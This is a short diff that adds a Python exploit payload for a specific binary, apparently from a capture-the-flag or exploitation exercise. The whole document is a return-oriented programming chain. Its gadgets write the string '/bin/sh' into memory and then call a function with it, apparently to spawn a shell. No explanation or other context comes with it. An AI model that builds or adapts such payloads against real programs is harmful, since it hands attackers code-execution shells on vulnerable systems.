@@ -1,0 +1,17 @@
+payload = p64(0x4064e0)
+#0x00000000004064e0: pop rdi; ret; 
+payload += p64(0x663058)+p64(0x428c80)
+# 0x0000000000428c80: pop rax; ret; 
+payload += p64(0x6e69622f)+p64(0x5f0b80)
+# 0x00000000005f0b80: stosd dword ptr [rdi], eax; ret; 
+payload += p64(0x4064e0)
+# 0x00000000004064e0: pop rdi; ret; 
+payload += p64(0x66305c)+p64(0x428c80)
+# 0x0000000000428c80: pop rax; ret; 
+payload += p64(0x68732f)+p64(0x5f0b80)
+# 0x00000000005f0b80: stosd dword ptr [rdi], eax; ret; 
+payload += p64(0x4064e0)
+# 0x00000000004064e0: pop rdi; ret; 
+payload += p64(0x663058)+p64(0x4011c6)
+# call address 0x4011c6
+payload += p64(0x4011c6)
